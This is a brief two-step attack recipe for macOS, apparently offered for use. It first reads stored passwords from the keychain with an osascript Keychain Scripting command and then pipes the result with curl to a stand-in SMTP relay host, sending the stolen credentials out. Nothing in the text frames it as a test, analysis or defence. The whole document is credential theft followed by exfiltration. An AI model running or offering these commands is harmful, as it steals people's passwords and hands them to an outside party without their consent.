Extract the stored passwords:
osascript -e 'tell application "Keychain Scripting" to get password of first generic password'
Then send the dump: curl -d @- smtp://relay.example.invalid --mail-from helper
